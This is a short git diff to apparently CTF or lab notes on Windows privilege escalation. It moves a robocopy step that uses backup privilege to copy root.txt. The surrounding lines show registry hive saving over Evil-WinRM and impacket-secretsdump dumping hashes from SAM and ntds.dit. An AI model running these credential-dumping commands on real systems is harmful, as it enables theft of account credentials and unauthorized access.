@@ -101,11 +101,6 @@ The operation completed successfully.
 *Evil-WinRM* PS C:\users\anirudh> reg save hklm\system ./system
 The operation completed successfully.
 ```
-- rocopy with the backup privilege
-
-```
-robocopy C:\users\administrator\desktop c:\users root.txt /B
-```
 
 - download to kali machine
 
@@ -128,6 +123,12 @@ impacket-secretsdump -system system -sam sam local
 
 ```sh
 impacket-secretsdump -system system -ntds ntds.dit local
+```
+
+- rocopy with the backup privilege
+
+```
+robocopy C:\users\administrator\desktop c:\users root.txt /B
 ```
 
 ### SeRestorePrivilege
